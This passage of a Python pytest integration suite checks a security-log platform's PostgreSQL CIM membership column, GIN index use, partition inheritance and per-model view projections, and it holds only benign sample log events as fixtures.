            "       COALESCE(k.cols, '{}'::text[]) AS cols "
            "FROM pg_index i "
            "JOIN pg_class c ON c.oid = i.indexrelid "
            "JOIN pg_am am ON am.oid = c.relam "
            "LEFT JOIN LATERAL ( "
            "    SELECT array_agg(a.attname::text ORDER BY u.ord) AS cols "
            "    FROM unnest(i.indkey::smallint[]) WITH ORDINALITY AS u(attnum, ord) "
            "    JOIN pg_attribute a "
            "      ON a.attrelid = i.indrelid AND a.attnum = u.attnum "
            ") k ON true "
            "WHERE i.indrelid = %s::regclass", (relation,)).fetchall()
    return [{"name": r["indexname"], "definition": r["indexdef"],
             "method": r["method"], "columns": list(r["cols"])} for r in rows]


def _gin_indexes_on(db, relation: str, column: str) -> list[dict]:
    """The indexes of `relation` whose ACCESS METHOD is GIN and whose one indexed COLUMN
    is `column` — the two facts `cim_models @> ARRAY[...]` actually needs, asked of the
    catalog rather than inferred from an index name."""
    return [ix for ix in _indexes(db, relation)
            if ix["method"] == "gin" and ix["columns"] == [column]]


def _index_summary(idxs: list[dict]) -> list[tuple]:
    """`(name, method, columns)` per index — what a failure message should show, because
    the NAME alone is exactly the thing that used to be mistaken for evidence."""
    return [(ix["name"], ix["method"], ix["columns"]) for ix in idxs]


def test_cim_column_and_gin_index_exist_on_the_events_parent(clean_db):
    """schema.sql's half of Backbone 2. Asserted first and on its own because every
    other test in this section is meaningless if this one fails."""
    with clean_db.pool().connection() as conn:
        col = conn.execute(
            "SELECT udt_name, is_generated FROM information_schema.columns "
            "WHERE table_schema = current_schema() AND table_name = 'events' "
            "AND column_name = 'cim_models'").fetchone()
    idxs = _indexes(clean_db, "events")
    gin = _gin_indexes_on(clean_db, "events", "cim_models")

    assert col is not None, (
        "events.cim_models does not exist. schema.sql's "
        "`ALTER TABLE events ADD COLUMN IF NOT EXISTS cim_models text[]` never ran -- "
        "either it is missing from schema.sql or db.split_statements stopped short of "
        "it (see the KNOWN GAPS in that function: dollar quoting, /* */ comments and "
        "E'' literals are all unhandled, and any of them would cut the script apart)")
    assert col["udt_name"] == "_text", (
        f"events.cim_models is {col['udt_name']!r}; the design requires text[] (_text)")
    assert col["is_generated"] == "NEVER", (
        "events.cim_models is a GENERATED column. Decision 1 requires a PLAIN column "
        "filled in Python at ingest: PG16 freezes a generation expression at ADD COLUMN, "
        "and detection needs membership BEFORE the INSERT")
    assert gin, (
        "there is no index on events whose access method is GIN and whose indexed column "
        "is `cim_models`, so `cim_models @> ARRAY[...]` can only ever be a full scan. "
        "app.cim.sql.index_ddl() was deleted, which makes schema.sql the only place this "
        "index can come from. Indexes present as (name, method, columns): "
        f"{_index_summary(idxs)}")
    assert "USING gin (cim_models)" in gin[0]["definition"], (
        f"the index DEFINITION is {gin[0]['definition']!r}. The catalog says GIN over "
        "cim_models, so this should be unreachable -- it is asserted because the "
        "definition is the one form an operator reads in psql, and the two must agree")


def test_partition_created_later_inherits_cim_models(clean_db):
    """FACT (a) of the storage design, and the one nobody could check while writing it.

    `db.ensure_partitions` emits `CREATE TABLE ... PARTITION OF events FOR VALUES ...`
    with NO column list, and `cim_models` is added to the parent by a post-hoc ALTER in
    schema.sql. The claim is that a partition created long after that ALTER still gets
    the column *and* a child copy of the GIN index. If PostgreSQL did not derive both
    from the parent, every event ingested into a future month would silently store no
    membership at all — with no error anywhere.
    """
    db = clean_db
    assert _CIM_PART not in _partitions(db), (
        f"{_CIM_PART} already existed before this test ingested anything, so it cannot "
        "prove ensure_partitions created it. clean_db is supposed to drop every "
        "events_YYYYMM partition")

    _store(db, [_win_auth("cim-partition-probe")])

    assert _CIM_PART in _partitions(db), (
        f"ensure_partitions did not create {_CIM_PART} for an event timestamped {_CIM_T}")
    with db.pool().connection() as conn:
        col = conn.execute(
            "SELECT udt_name FROM information_schema.columns "
            "WHERE table_schema = current_schema() AND table_name = %s "
            "AND column_name = 'cim_models'", (_CIM_PART,)).fetchone()
        stored = conn.execute(
            f"SELECT cim_models FROM {_CIM_PART}").fetchall()          # the child, direct
    idxs = _indexes(db, _CIM_PART)
    child_gin = _gin_indexes_on(db, _CIM_PART, "cim_models")
    assert col is not None and col["udt_name"] == "_text", (
        f"{_CIM_PART} has no cim_models text[] column. `CREATE TABLE ... PARTITION OF` "
        "did not inherit the column the parent's ALTER added, so ingest into any new "
        "month would fail or store nothing")
    assert [r["cim_models"] for r in stored] == [["authentication"]], (
        f"the row landed in {_CIM_PART} but its cim_models is "
        f"{[r['cim_models'] for r in stored]}; db._row binds cim_models_for(evt) and a "
        "Windows 4625 event is ['authentication']")
    assert child_gin, (
        f"{_CIM_PART} has no index whose access method is GIN and whose indexed column is "
        "`cim_models`. The parent-level index did not recurse to a partition created "
        "after it, so `@>` degrades to a sequential scan on every future month. This is "
        "the ONLY child-partition index assertion in the suite, so it is asked of the "
        "catalog (pg_am + pg_attribute) and not of an index name: PostgreSQL derives the "
        "child's name from the parent's, so the string `cim_models_idx` appears in it "
        "whatever the index is actually built over. Indexes present as "
        f"(name, method, columns): {_index_summary(idxs)}")
    assert "USING gin (cim_models)" in child_gin[0]["definition"], (
        f"the child index DEFINITION is {child_gin[0]['definition']!r}, which does not "
        "index cim_models with GIN")


def test_gin_index_serves_the_cim_containment_predicate(clean_db):
    """FACT (b): `cim_models @> ARRAY['dns']::text[]` is INDEX-SERVED.

    The whole performance premise of the model views, of LOQL `| datamodel X` and of the
    /datamodels member counts is that this predicate never scans three years of
    partitions. If the GIN opclass does not match the operator, or the index is not on
    the right column, the feature still returns correct answers and silently costs a
    full scan — the kind of defect a customer finds, not CI.

    Two deliberate choices make the assertion mean one thing:
      * 2000 rows are ingested (not three), of which only 12 carry 'dns', so the
        selectivity is realistic and ANALYZE has real statistics to work from;
      * `enable_seqscan = off` is set for the EXPLAIN. On a table this small the planner
        may legitimately prefer a sequential scan on cost alone, and this test is not
        about the cost model — it asks whether the index CAN serve the predicate at all.

    WHAT THE ASSERTION LOOKS AT, AND WHY IT IS NOT "Seq Scan". This test used to also
    assert `"Seq Scan" not in forced`, on the stated premise that PostgreSQL falls back to
    a sequential scan when no index serves the predicate. It does not have to. With
    seqscan penalised, PG16 will happily choose a FULL scan of an unrelated index — the
    `(id, event_time)` primary key — and apply `cim_models @> ...` as a post-scan
    `Filter`. That plan contains no "Seq Scan" anywhere while evaluating the predicate
    against all 2000 rows — precisely the unindexed behaviour this test exists to forbid,
    and the old assertion said nothing about it. Its partner (`"cim_models_idx" in forced`)
    is kept below, but it only catches an index that is ABSENT: an index of that name
    built over the wrong column is still named in the plan that scans it.

    What actually discriminates "the GIN index served this predicate" from "some index was
    scanned" is WHERE THE PREDICATE LANDS in the plan:

      * served    -> `Index Cond: (cim_models @> '{dns}'::text[])` under a Bitmap Index
                     Scan (GIN supports no other scan shape), and the rows never touched;
      * not served -> the same expression appears as `Filter:` / `Recheck Cond` on a node
                     driven by something else, having read every row to throw it away.

    Both are asserted, in both directions, because the positive alone is weaker than it
    looks: a plan can carry an `Index Cond` on one partition and a `Filter` on another.
    The natural plan is captured too and printed on failure, so the CI log shows both.
    """
    db = clean_db
    bulk = [_evt(event_time=_CIM_T, vendor="zeek", product="zeek", log_type="conn",
                 message=f"cim-bulk-{i}", raw={"n": i}) for i in range(1988)]
    needles = [_evt(event_time=_CIM_T, vendor="zeek", product="zeek", log_type="dns",
                    message=f"cim-dns-{i}", raw={"query": f"h{i}.example.test"})
               for i in range(12)]
    _store(db, bulk + needles)

    predicate = "SELECT id FROM events WHERE cim_models @> ARRAY['dns']::text[]"
    with db.pool().connection() as conn:
        matched = conn.execute(
            "SELECT count(*) AS n FROM events "
            "WHERE cim_models @> ARRAY['dns']::text[]").fetchone()["n"]
        conn.execute("ANALYZE events")
        conn.commit()
        with conn.transaction():
            natural = "\n".join(r["QUERY PLAN"] for r in conn.execute(
                f"EXPLAIN (COSTS off) {predicate}").fetchall())
        with conn.transaction():
            conn.execute("SET LOCAL enable_seqscan = off")
            forced = "\n".join(r["QUERY PLAN"] for r in conn.execute(
                f"EXPLAIN (ANALYZE, COSTS off, TIMING off, SUMMARY off) {predicate}"
            ).fetchall())

    assert matched == 12, (
        f"{matched} rows matched `@> ARRAY['dns']` but 12 were ingested as DNS events. "
        "Before asking whether the index is used, the predicate has to be CORRECT -- "
        "either ingest stored the wrong tags or containment is not doing what we think")
    plans = (f"--- plan with enable_seqscan off ---\n{forced}\n"
             f"--- plan the planner chose on its own ---\n{natural}")
    assert "cim_models_idx" in forced, (
        "the GIN index on events.cim_models cannot serve "
        "`cim_models @> ARRAY['dns']::text[]`, so the containment predicate is a full "
        f"scan of every partition and the whole datamodel: design is unindexed.\n{plans}")

    # The predicate was pushed INTO an index ...
    served = re.search(r"Index Cond:[^\n]*cim_models @>", forced)
    # ... and nowhere is it evaluated row-by-row after a scan chose rows for other reasons.
    # `Recheck Cond` is deliberately NOT matched here: on a bitmap heap scan it is the
    # harmless twin of the Index Cond above it and appears in the very plan we want.
    filtered = re.search(r"Filter:[^\n]*cim_models @>", forced)
    assert served is not None, (
        "`cim_models @> ARRAY['dns']::text[]` never appears as an Index Cond, so no index "
        "SERVED it -- whatever was scanned, the predicate was applied afterwards to rows "
        "the scan had already read. That is a full pass over every partition wearing an "
        f"index's name, which is why the index name alone is not the test.\n{plans}")
    assert filtered is None, (
        "`cim_models @> ARRAY['dns']::text[]` is ALSO applied as a post-scan Filter, so at "
        "least one partition is being read in full and filtered rather than probed "
        "through the GIN index -- a partition whose child index is missing looks exactly "
        f"like this.\n{plans}")
    # The quantitative statement of the same thing: an index-served predicate discards
    # nothing, whereas the pkey-plus-Filter plan discards all 1988 non-DNS rows.
    discarded = [int(m) for m in re.findall(r"Rows Removed by Filter: (\d+)", forced)]
    assert sum(discarded) == 0, (
        f"the plan read and then discarded {sum(discarded)} row(s) ({discarded}). Only "
        f"12 of the 2000 rows carry 'dns'; a GIN-served predicate visits those 12.\n"
        f"{plans}")


def test_init_cim_creates_a_view_per_model_projecting_the_registry_field_names(clean_db):
    """Every model gets a `cim_<tag>` view, and each view's COLUMN NAMES are the CIM
    field names the registry declares. This is the only place all eleven view bodies are
    ever handed to a SQL parser — a bad `raw #>> ARRAY[...]` path or a mis-quoted label
    (`user` is a reserved word) fails here and nowhere else.

    THE VIEWS ARE DROPPED FIRST, and that is what makes the sentence above true. `clean_db`
    keeps the views of real models, so without the drop every assertion here could be
    answered by views an earlier test built: an `init_cim` that appended to `applied` and
    executed no DDL would report the right names, pg_views would still list the leftovers,
    and `SELECT * FROM cim_<tag> LIMIT 0` would hand back the stale projection. Clearing
    the ground makes each of those a statement about THIS call.
    """
    db = clean_db
    reg = cim.get_registry()
    expected = {cim.view_name(m) for m in reg.models}

    _drop_cim_views(db, expected)
    assert not (expected & _cim_views(db)), (
        "the CIM views survived an explicit DROP, so nothing below can distinguish a view "
        "init_cim created from one it inherited")

    res = db.init_cim()

    assert set(res["views"]) == expected, (
        f"init_cim reported views {sorted(res['views'])}, registry defines "
        f"{sorted(expected)}")
    present = _cim_views(db)
    assert expected <= present, (
        f"init_cim returned success but these views are not in pg_views: "
        f"{sorted(expected - present)}")

    mismatched = []
    for m in reg.models:
        want = _expected_view_columns(m)
        try:
            got = _view_columns(db, cim.view_name(m))
        except Exception as exc:  # noqa: BLE001 -- report every view, not just the first
            mismatched.append(f"{cim.view_name(m)}\n    unreadable: {exc}")
            continue
        if got != want:
            mismatched.append(f"{cim.view_name(m)}\n    got:  {got}\n    want: {want}")
    assert not mismatched, (
        "these CIM views do not project the columns their model declares (a field "
        "rename, a dropped passthrough, or a label that PostgreSQL folded):\n"
        + "\n".join(mismatched))


def test_every_cim_view_returns_exactly_its_own_members(clean_db):
    """The eleven view WHERE clauses, evaluated.

    The test above proves the views EXIST and project the right column NAMES; it reads
    `LIMIT 0`, so not one row has ever passed through a `cim_<tag>` view. The WHERE clause
    is `sql.membership_predicate(tag)` — `cim_models @> ARRAY['<tag>']::text[]` — and it is
    the join between the tags ingest stamped and the model surface analysts query. Wrong,
    a view is silently empty (or silently everything), which reads exactly like "there
    were no such events".

    Both directions are asserted, and the empty models are the sharper half: Email and
    Vulnerability are empty BY DESIGN, so a view that lost its WHERE clause entirely
    returns all six events there and fails loudly, where a populated model would still
    look plausible. The Modbus event is in TWO models on purpose — `@>` is containment,
    not equality, and a `<@` typo would drop a multi-model row out of both views.
    """
    db = clean_db
    db.init_cim()
    _store(db, [
        _win_auth("cim-member-logon"),                             # -> authentication
        _win_auth("cim-member-process", event_id=4688),            # -> endpoint
        _ot_write("cim-member-modbus"),                            # -> ics AND network
        _web_request("cim-member-http", {"url": "/index.html"}),   # -> web
        _dns_query("cim-member-dns", {"query": "a.example.test"}),  # -> dns
        _untagged("cim-member-nothing"),                           # -> no model at all
    ])

    expected = {
        "authentication": {"cim-member-logon"},
        "endpoint": {"cim-member-process"},
        "ics": {"cim-member-modbus"},
        "network": {"cim-member-modbus"},
        "web": {"cim-member-http"},
        "dns": {"cim-member-dns"},
        # Populated by no fixture above, and two of them by nothing at all: Change,
        # Malware and IDS have live clauses that none of these six events satisfy, and
        # Email / Vulnerability ship with forward-looking clauses and no member sources.
        "change": set(), "malware": set(), "ids": set(),
        "email": set(), "vulnerability": set(),
    }
    reg = cim.get_registry()
    assert {m.tag for m in reg.models} == set(expected), (
        f"the registry defines {sorted(m.tag for m in reg.models)} but this test states "
        f"an expectation for {sorted(expected)}. A model added to models.yaml must be "
        "given a row here rather than sliding through unverified -- that is how eleven "
        "views ended up with no membership test in the first place")

    wrong = {}
    for m in reg.models:
        view = cim.view_name(m)
        got = set(_view_rows(db, view))
        if got != expected[m.tag]:
            wrong[view] = {"returned": sorted(got), "expected": sorted(expected[m.tag])}
    assert not wrong, (
        "these CIM views do not select their members. The WHERE clause is "
        "`cim_models @> ARRAY['<tag>']::text[]`, so a view returning EVERYTHING lost the "
        "predicate, a view returning NOTHING is filtering on the wrong token (the model "
        "name instead of its tag, say), and a multi-model row missing from one of its "
        f"two views means containment became equality: {wrong}")


def test_cim_view_projects_column_expr_and_the_quoted_user_field(clean_db):
    """Field VALUES, read back through `cim_authentication`.

    Every field expression in the registry is emitted by `cim.sql.field_value_sql` and,
    until now, executed by nothing: the column-name test reads `LIMIT 0`, so `host()`,
    `concat_ws` and the quoted labels were all unevaluated string assembly. This model
    carries three of the four source kinds — `column` (including two fields over ONE
    column, and an `inet` column that must render bare), `expr` (the whitelisted
    `vendor_product` snippet) — plus `user`, the reserved word the quoter exists for.
    """
    db = clean_db
    db.init_cim()
    _store(db, [_evt(event_time=_CIM_T, vendor="microsoft", product="windows",
                     log_type="security", severity="high", action="failure",
                     src_ip="10.0.0.7", host_name="WS-01", user_name="jdoe",
                     app="ntlm", rule_name="An account failed to log on",
                     message="cim-proj-logon",
                     raw={"event_id": 4625, "probe": "cim-proj-logon"})])

    rows = _view_rows(db, "cim_authentication")
    assert set(rows) == {"cim-proj-logon"}, (
        f"cim_authentication returned {sorted(rows)}; a Windows 4625 is the canonical "
        "member of this model")
    row = rows["cim-proj-logon"]

    assert row["user"] == "jdoe", (
        f"the CIM field `user` came back as {row['user']!r}. It is `user_name AS \"user\"`"
        " -- the label is DOUBLE-QUOTED because `user` is a PostgreSQL reserved word, and "
        "this is the first time any row has been read through it")
    assert row["src"] == "10.0.0.7", (
        f"`src` is {row['src']!r}. It is `host(src_ip)`: without the host() wrapper an "
        "inet renders as 10.0.0.7/32, which matches nothing an analyst or a detection "
        "would compare against")
    assert row["dest"] == "WS-01" and row["dvc"] == "WS-01", (
        f"`dest`={row['dest']!r} `dvc`={row['dvc']!r}; both are `host_name`, so one "
        "column legitimately feeds two CIM field labels and neither may swallow the other")
    assert row["vendor_product"] == "microsoft:windows", (
        f"`vendor_product` is {row['vendor_product']!r}. It is the only `expr:` field in "
        "the registry -- `concat_ws(':', vendor, product)` out of sql._NAMED_EXPR, and "
        "STABLE rather than IMMUTABLE, which is exactly why fields live in views")
    assert row["action"] == "failure" and row["severity"] == "high"
    assert row["signature"] == "An account failed to log on"
    assert row["app"] == "ntlm"
    # Passthrough columns: `vendor`, `product`, `log_type` and `message` are projected
    # because no field of this model claimed those names. `severity` is NOT among them
    # here -- a field took it -- which is the rule _expected_view_columns states.
    assert (row["vendor"], row["product"], row["log_type"]) == \
        ("microsoft", "windows", "security")
    assert row["raw"]["event_id"] == 4625, (
        "`raw` is projected last for drill-down and must arrive as jsonb, not as text")

    # And the reason the label is quoted, made executable. An UNQUOTED `user` in a query
    # against this view does not resolve to the column at all: PostgreSQL parses the bare
    # keyword as CURRENT_USER and hands back the connection role on every row. This is
    # what `sql._quote_ident` is defending, and it is why every consumer of a CIM view
    # (and the LOQL `datamodel:` projection) has to spell it "user".
    with db.pool().connection() as conn:
        probe = conn.execute('SELECT "user" AS quoted, user AS bare, '
                             "current_user AS role FROM cim_authentication").fetchone()
    assert probe["quoted"] == "jdoe", (
        f'SELECT "user" returned {probe["quoted"]!r}; the quoted label is the column and '
        "must carry the event's user_name")
    assert probe["bare"] == probe["role"], (
        f"a bare `SELECT user` returned {probe['bare']!r} rather than the connection role "
        f"{probe['role']!r}. The assertion is here to keep the hazard visible: if this "
        "ever stops holding, the unquoted spelling has become safe and _quote_ident's "
        "rationale needs rewriting -- until then, every reader must quote it")


def test_cim_view_projects_coalesce_alternatives_and_nested_jsonb_paths(clean_db):
    """The `raw:` fields — ordered alternatives (`COALESCE`) and nested paths (`#>>`).

    This is the half of `field_value_sql` that a Python unit test cannot check, because
    the question is what POSTGRESQL does with the emitted expression: does the first
    non-null alternative really win, in the order the registry lists them; does a nested
    alternative that comes FIRST stay first; does `#>> ARRAY['a','b']` descend one object
    level; and does a jsonb key stay byte-exact rather than case-folded.

    Every event below is built so exactly one alternative can supply the value, except
    the first, which supplies all four and must still answer with alternative one.
    """
    db = clean_db
    db.init_cim()
    _store(db, [
        # Web `url`: COALESCE(raw->>'url', raw#>>['http','url'], raw->>'uri', raw->>'path')
        # Web `site`: COALESCE(raw#>>['http','hostname'], raw->>'hostname', raw->>'site')
        _web_request("cim-coalesce-first", {
            "url": "/first", "uri": "/third", "path": "/fourth",
            "hostname": "top.example.test", "method": "GET", "status": 200,
            "user_agent": "curl/8.0",
            "http": {"url": "/second", "hostname": "nested.example.test"}}),
        _web_request("cim-coalesce-nested", {
            "site": "fallback.example.test",
            "http": {"url": "/only-nested", "http_method": "POST", "status": 404,
                     "http_user_agent": "Mozilla/5.0"}}),
        _web_request("cim-coalesce-last", {
            "path": "/only-path", "status_code": 500,
            "hostname": "host-only.example.test"}),
        # DNS `query`: COALESCE(raw->>'query', raw->>'QueryName', raw#>>['dns','rrname'])
        _dns_query("cim-coalesce-suricata", {
            "dns": {"rrname": "evil.example.test", "rrtype": "A",
                    "rdata": "203.0.113.7"}}),
        _dns_query("cim-coalesce-sysmon", {
            "QueryName": "sysmon.example.test", "QueryResults": "10.1.1.1"}),
        # Industrial: nested-only fields plus nested-then-top-level alternatives.
        _ics_op("cim-coalesce-modbus", "modbus", "write-registers", {
            "ot": {"protocol": "modbus", "operation": "write_single_register",
                   "is_write": True, "address": 40001, "quantity": 2, "unit_id": 1},
            "func": "write_multiple_registers"}),
        _ics_op("cim-coalesce-dnp3", "dnp3", "read-points", {
            "ot": {"protocol": "dnp3", "operation": "read", "is_write": False},
            "start_address": 100, "fc_request": "READ"}),
    ])

    web = _view_rows(db, "cim_web")
    dns = _view_rows(db, "cim_dns")
    ics = _view_rows(db, "cim_ics")
    assert set(web) == {"cim-coalesce-first", "cim-coalesce-nested", "cim-coalesce-last"}
    assert set(dns) == {"cim-coalesce-suricata", "cim-coalesce-sysmon"}
    assert set(ics) == {"cim-coalesce-modbus", "cim-coalesce-dnp3"}

    # ── ordered alternatives: the FIRST non-null wins, in registry order ──────
    first = web["cim-coalesce-first"]
    assert first["url"] == "/first", (
        f"`url` is {first['url']!r} with all four alternatives present. The registry "
        "lists [url, [http, url], uri, path] and COALESCE takes them in that order, so "
        "anything but '/first' means the alternatives were reordered or reversed")
    assert first["site"] == "nested.example.test", (
        f"`site` is {first['site']!r}. Its FIRST alternative is the nested "
        "`[http, hostname]` and its second is the top-level `hostname`, so 'top.example."
        "test' here would mean a nested alternative is being demoted -- and `site` would "
        "start reporting web_access.py's CLF client host as the site, which is precisely "
        "the mix-up the registry comment warns about")
    assert first["http_method"] == "GET"
    assert first["status"] == "200", (
        f"`status` is {first['status']!r}; jsonb ->> renders the NUMBER 200 as the text "
        "'200', and a CIM field is text")
    assert first["http_user_agent"] == "curl/8.0"

    # ── a nested alternative resolving on its own (`#>> ARRAY[...]` descends) ─
    nested = web["cim-coalesce-nested"]
    assert nested["url"] == "/only-nested", (
        f"`url` is {nested['url']!r} for an event whose only source is raw['http']['url']."
        " That is `raw #>> ARRAY['http', 'url']` -- an ARRAY constructor rather than a "
        "'{a,b}' literal, so a key containing a space or a comma cannot break it")
    assert nested["http_method"] == "POST" and nested["status"] == "404"
    assert nested["http_user_agent"] == "Mozilla/5.0"
    assert nested["site"] == "fallback.example.test", (
        f"`site` is {nested['site']!r}: raw['http'] exists but carries no 'hostname', so "
        "the first alternative must yield NULL (not an error, and not the whole object) "
        "and fall through to the third")

    # ── the LAST alternative, reached only after three misses ────────────────
    last = web["cim-coalesce-last"]
    assert last["url"] == "/only-path", (
        f"`url` is {last['url']!r}; three alternatives are absent and only the fourth "
        "(`path`) can supply it")
    assert last["status"] == "500" and last["site"] == "host-only.example.test"
    assert last["http_method"] is None, (
        f"`http_method` is {last['http_method']!r}. No alternative is present, so the "
        "field must be SQL NULL -- a field is null for a source that does not provide it, "
        "exactly as in Splunk CIM, and an empty string would be a value")

    # ── jsonb keys are BYTE-EXACT: `QueryName` is not `queryname` ─────────────
    assert dns["cim-coalesce-sysmon"]["query"] == "sysmon.example.test", (
        "the Sysmon spelling `QueryName` did not resolve. jsonb keys are used verbatim "
        "here -- unlike detection.engine.flatten_event, which lower-cases them -- so a "
        "case-folding 'fix' would silently empty the DNS model for every EDR source")
    assert dns["cim-coalesce-sysmon"]["answer"] == "10.1.1.1"
    assert dns["cim-coalesce-sysmon"]["record_type"] is None
    suricata = dns["cim-coalesce-suricata"]
    assert suricata["query"] == "evil.example.test", (
        f"`query` is {suricata['query']!r}; suricata nests it at raw['dns']['rrname'], "
        "the third alternative and the only nested one")
    assert suricata["record_type"] == "A" and suricata["answer"] == "203.0.113.7"
    assert suricata["src"] == "10.0.0.33" and suricata["dvc"] == "SENSOR-1"

    # ── Industrial: nested-only fields, and a boolean rendered by jsonb ───────
    modbus = ics["cim-coalesce-modbus"]
    assert (modbus["protocol"], modbus["operation"]) == ("modbus",
                                                         "write_single_register"), (
        f"protocol={modbus['protocol']!r} operation={modbus['operation']!r}; both are "
        "single nested paths (`raw #>> ARRAY['ot', <key>]`) with no alternative to fall "
        "back on, so this is the narrowest test that #>> descends at all")
    assert modbus["is_write"] == "true", (
        f"`is_write` is {modbus['is_write']!r}. jsonb renders the boolean true as the "
        "TEXT 'true' (Python's str() would give 'True'), and app.cim.match._text spells "
        "the same mapping out so the SQL and Python evaluators agree")
    assert modbus["register"] == "40001" and modbus["quantity"] == "2"
    assert modbus["unit_id"] == "1"
    assert modbus["function_code"] == "write_multiple_registers"
    assert (modbus["src"], modbus["dest"]) == ("10.0.0.5", "10.0.10.9")
    assert modbus["session_id"] == "CxYz01"
    assert modbus["action"] == "write-registers", (
        "`action` is a plain column beside all the nested paths, and it is the one "
        "Industrial field an OT detection reads most -- a view whose jsonb fields resolve "
        "while its column fields do not would be a strange and entirely possible bug")

    dnp3 = ics["cim-coalesce-dnp3"]
    assert dnp3["is_write"] == "false", (
        f"`is_write` is {dnp3['is_write']!r}; jsonb false renders as 'false', and a field "
        "that read the missing key would be NULL instead -- which a rule written as "
        "`is_write != 'true'` would silently treat as neither")
    assert dnp3["register"] == "100", (
        f"`register` is {dnp3['register']!r}. raw['ot'] carries no 'address', so the "
        "nested first alternative must fall through to the top-level `start_address` -- "
        "a Zeek DNP3 log spells it that way and no other alternative can supply it")
    assert dnp3["function_code"] == "READ"
    assert dnp3["action"] == "read-points"
    assert dnp3["quantity"] is None and dnp3["unit_id"] is None


def test_init_cim_is_idempotent_across_two_runs(clean_db):
    """It runs on every application start, so a second run must be a no-op rather than
    an accumulating one: the same views PRESENT IN THE DATABASE after each run, nothing
    dropped, and exactly one stamp row.

    EVERY ASSERTION IS READ BACK FROM THE SERVER, and the previous version of this test is
    why that is spelled out. It compared `second['views'] == first['views']`,
    `dropped == []` twice, and `second['membership_hash'] == first['membership_hash']` —
    three comparisons of `init_cim`'s OWN RETURN VALUE against itself, one of which
    (`membership_hash`) is a pure function of the registry that never touches the database
    at all. An `init_cim` that created NO VIEWS WHATSOEVER satisfied all of them: `[] ==
    []` is true, and the same pure function called twice returns the same digest whether
    or not a single statement reached PostgreSQL. Only the `count(*) == 1` on cim_meta
    asked the database anything.
    """
    db = clean_db
    reg = cim.get_registry()
    expected = {cim.view_name(m) for m in reg.models}

    # `clean_db` keeps the views of real models, so they are almost certainly already
    # there from an earlier test. Drop them, or "the views exist afterwards" says nothing
    # about the two calls below.
    _drop_cim_views(db, expected)
    assert not (expected & _cim_views(db)), (
        "the CIM views survived an explicit DROP; the run below cannot be shown to have "
        "created anything")

    first = db.init_cim()
    after_first = _cim_views(db)
    second = db.init_cim()
    after_second = _cim_views(db)

    assert expected <= after_first, (
        f"after the FIRST init_cim these views are not in pg_views: "
        f"{sorted(expected - after_first)}. The registry defines {len(expected)} models "
        "and every one of them must have a view in the database, not merely a name in the "
        "return value")
    assert expected <= after_second, (
        f"after the SECOND init_cim these views are not in pg_views: "
        f"{sorted(expected - after_second)}; a re-run must not remove what the first "
        "built (the views are DROP + CREATE, so a create that fails the second time round "
        "leaves nothing behind)")
    assert after_second == after_first, (
        f"the set of cim_* views in the database changed between two identical runs: "
        f"gained {sorted(after_second - after_first)}, lost "
        f"{sorted(after_first - after_second)}. Idempotent means the database looks the "
        "same, not that the return value does")
    assert set(second["views"]) == set(first["views"]) == expected, (
        f"init_cim reported {sorted(first['views'])} then {sorted(second['views'])} for a "
        f"registry of {sorted(expected)}")
    assert first["dropped"] == [] and second["dropped"] == [], (
        f"init_cim dropped views on a clean registry: {first['dropped']} then "
        f"{second['dropped']}; only a model REMOVED from models.yaml should be dropped")

    with db.pool().connection() as conn:
        rows = conn.execute("SELECT * FROM cim_meta").fetchall()
    assert len(rows) == 1, (
        f"cim_meta holds {len(rows)} rows. It is a one-row stamp written by an ON CONFLICT "
        "upsert against a boolean primary key; more than one row means the upsert is "
        "inserting instead of updating")
    # The STORED fingerprint, not the returned one: `membership_hash` in the result dict is
    # `cim_membership_fingerprint(reg)` recomputed in Python, so comparing two results
    # proves only that a pure function is deterministic.
    assert rows[0]["membership_hash"] == db.cim_membership_fingerprint(reg), (
        f"cim_meta.membership_hash is {rows[0]['membership_hash']!r} but the registry "
        f"fingerprints to {db.cim_membership_fingerprint(reg)!r}; the stamp names a "
        "registry that was never applied")
    assert list(rows[0]["model_tags"]) == [m.tag for m in reg.models], (
        f"cim_meta.model_tags is {rows[0]['model_tags']} for a registry of "
        f"{[m.tag for m in reg.models]}")
    assert rows[0]["registry_version"] == reg.version


def test_stamping_the_cim_registry_twice_updates_the_row_it_conflicts_with(clean_db):
    """The ON CONFLICT DO UPDATE half of `db._CIM_STAMP_UPSERT`, which nothing else in the
    suite can see.

    `clean_db` TRUNCATEs cim_meta before every test, so the first `_stamp_cim` of any test
    always takes the INSERT branch. Change `DO UPDATE SET …` to `DO NOTHING` and the entire
    integration suite still passes — including the idempotency test above, whose second
    `init_cim` writes a stamp identical to the first one and therefore cannot tell an
    update from an ignored conflict.

    It is not cosmetic. The row feeds `cim_status()`, i.e. the operator-facing
    `restart_required` / `backfill_due` on /admin and /datamodels and the registry version
    /health reports. Under DO NOTHING the stamp freezes at whatever registry was applied to
    an empty cim_meta — the FIRST boot of the database, for ever — so every models.yaml
    edit afterwards is applied to the views and never recorded, and the page reports a
    registry that has not been live for months.

    So this test stamps twice with DIFFERENT registry state inside ONE test. The second
    registry is the real one plus an extra model: the version, the tag list and the
    membership fingerprint all change (which is what must be visible in the row), while
    every real model stays in `keep` so the eleven live views are not dropped as orphans
    on the way through.
    """
    db = clean_db
    real = cim.get_registry()

    extra = CimModel(
        name="Stamp Probe", tag="stampprobe", version=1,
        description="a model that exists only for the duration of this test",
        clauses=(CimClause(terms=(CimTerm(source=CimSource.column_of("vendor"),
                                          values=("no-such-vendor",), label="v"),)),),
        fields=(CimField(name="user", source=CimSource.column_of("user_name")),))
    edited = CimRegistry(version=real.version + 1000, models=real.models + (extra,))
    assert db.cim_membership_fingerprint(edited) != db.cim_membership_fingerprint(real), (
        "the two registries fingerprint identically, so an unchanged row would be "
        "indistinguishable from an updated one and this test would prove nothing")

    try:
        db.init_cim()                                   # INSERT branch (cim_meta is empty)
        # Fill the BACKFILL half of the row too, so the second stamp has something it
        # could destroy. With no events this completes as an unbounded full pass and
        # writes `backfilled_at` / `backfill_hash` — the columns `_stamp_cim`'s docstring
        # promises never to touch.
        db.backfill_cim()
        with db.pool().connection() as conn:
            before = conn.execute("SELECT * FROM cim_meta WHERE id = true").fetchone()
        assert before is not None and before["registry_version"] == real.version, (
            f"the first stamp did not land: {before}")
        assert before["backfill_hash"] == db.cim_membership_fingerprint(real), (
            f"the backfill stamp did not land ({before['backfill_hash']!r}), so the "
            "assertion below that init_cim leaves it alone would hold trivially")

        db.init_cim(registry=edited)                    # ON CONFLICT branch
        with db.pool().connection() as conn:
            rows = conn.execute("SELECT * FROM cim_meta").fetchall()

        assert len(rows) == 1, (
            f"cim_meta holds {len(rows)} rows after two stamps; the boolean primary key "
